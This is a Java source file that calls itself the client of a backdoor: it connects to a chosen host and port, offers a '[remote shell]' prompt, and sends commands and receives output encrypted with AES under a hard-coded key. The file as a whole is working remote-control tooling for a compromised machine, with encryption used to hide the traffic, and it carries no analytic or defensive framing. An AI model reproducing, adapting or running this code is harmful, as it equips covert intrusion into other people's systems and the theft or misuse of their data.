import org.apache.commons.codec.binary.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.security.Key;
import java.security.SecureRandom;
import java.util.Scanner;

/**
 * This is the backdoor client
 *
 * @author salah3x
 */
public class Client {

	public static void main(String[] args) throws IOException {

		//Server ip
		String host = "127.0.0.1";

		//Port to listen to
		int port = 9999;

		if (args.length == 2) {
			host = args[0];
			port = Integer.valueOf(args[1]);
		}

		//The signal to let the client know that the request is finished
		//there will be no data to wait for(needed by the client to stop reading from output stream)
		String endSignal = "%**%";

		//The  encryption key used to encrypt an decrypt communication
		//Symmetric encryption is used
		String encryptionKey = "sixteen byte key";

		//A helper class used to encrypt and decrypt Strings
		//Uses the AES algorithm
		Server.CryptoHelper cryptoHelper = new Server.CryptoHelper(encryptionKey);

		//Starting the server
		Socket socket = new Socket(host, port);

		//Used to red user input
		Scanner scanner = new Scanner(System.in);
		//Used to write data to socket's output stream
		PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
		//Used to read data from socket's input stream
		BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));

		//Check if we are/still connected to server
		while (!socket.isClosed()) {
			try {
				//Getting user input
				System.out.print("[remote shell] $ ");
				String cmd = scanner.nextLine();

				//Encrypting and sending command
				printWriter.println(cryptoHelper.encrypt(cmd));
				printWriter.flush();

				if (cmd.equals("exit"))
					break;

				//Reading, decrypting and printing output to console
				String line;
				while ((line = cryptoHelper.decrypt(br.readLine())) != null) {
					//Until there is no data to read
					if (line.endsWith(endSignal))
						break;
					System.out.println(line);
				}
			} catch (Exception e) {
				e.printStackTrace();
				br.close();
				printWriter.close();
				socket.close();
			}
		}
		System.out.println("Disconnected from server");
	}

	/**
	 * This helper class deals with Cipher class and byte arrays in order
	 * to provide an abstraction to use encryption on strings
	 */
	static class CryptoHelper {

		private Key key;

		public CryptoHelper(String key) {
			this.key = new SecretKeySpec(key.getBytes(), "AES");
		}

		static byte[] generateIV() {
			SecureRandom random = new SecureRandom();
			byte[] iv = new byte[16];
			random.nextBytes(iv);
			return iv;
		}

		public String encrypt(String plaintext) throws Exception {
			byte[] iv = generateIV();
			byte[] decrypted = plaintext.getBytes();
			byte[] encrypted = encrypt(iv, decrypted);
			StringBuilder ciphertext = new StringBuilder();
			ciphertext.append(Base64.encodeBase64String(iv));
			ciphertext.append(":");
			ciphertext.append(Base64.encodeBase64String(encrypted));
			return ciphertext.toString();

		}

		public String decrypt(String ciphertext) throws Exception {
			String[] parts = ciphertext.split(":");
			byte[] iv = Base64.decodeBase64(parts[0]);
			byte[] encrypted = Base64.decodeBase64(parts[1]);
			byte[] decrypted = decrypt(iv, encrypted);
			return new String(decrypted);
		}

		byte[] encrypt(byte[] iv, byte[] plaintext) throws Exception {
			Cipher cipher = Cipher.getInstance(key.getAlgorithm() + "/CBC/PKCS5Padding");
			cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
			return cipher.doFinal(plaintext);
		}

		byte[] decrypt(byte[] iv, byte[] ciphertext) throws Exception {
			Cipher cipher = Cipher.getInstance(key.getAlgorithm() + "/CBC/PKCS5Padding");
			cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
			return cipher.doFinal(ciphertext);
		}
	}
}